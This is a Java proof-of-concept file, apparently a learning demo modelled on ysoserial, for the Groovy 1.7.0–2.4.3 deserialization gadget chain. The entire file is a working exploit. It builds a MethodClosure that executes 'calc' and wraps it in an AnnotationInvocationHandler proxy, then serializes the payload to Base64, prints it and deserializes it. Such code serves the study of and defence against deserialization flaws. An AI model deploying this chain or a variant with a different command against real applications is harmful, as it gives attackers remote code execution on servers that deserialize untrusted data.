package ysoserial.vulndemo;
/**
 * Groovy : 1.7.0-2.4.3
 *
 * AnnotationInvocationHandler.readObject()
 *     Map.entrySet() (Proxy)
 *         ConversionHandler.invoke()
 *             ConvertedClosure.invokeCustom()
 * 		        MethodClosure.call()
 *                     ProcessGroovyMethods.execute()
 */

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Map;

public class Groovy_POC {
    public static String serialize(Object obj) throws Exception{
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(barr);
        outputStream.writeObject(obj);
        byte[] bytes = barr.toByteArray();
        barr.close();
        return Base64.getEncoder().encodeToString(bytes);
    }
    public static void unserialize(String base64) throws Exception{
        byte[] decode = Base64.getDecoder().decode(base64);
        ByteArrayInputStream barr = new ByteArrayInputStream(decode);
        ObjectInputStream inputStream = new ObjectInputStream(barr);
        inputStream.readObject();
    }
    public static void main(String[] args) throws Exception{
        //封装对象
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, "entrySet");
        //反射获取AnnotationInvocationHandler构造方法
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        //动态代理
        Map map = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, convertedClosure);
        //初始化
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
        //序列化
        String serialize = serialize(invocationHandler);
        System.out.println(serialize);
        //反序列化
        unserialize(serialize);
    }
}
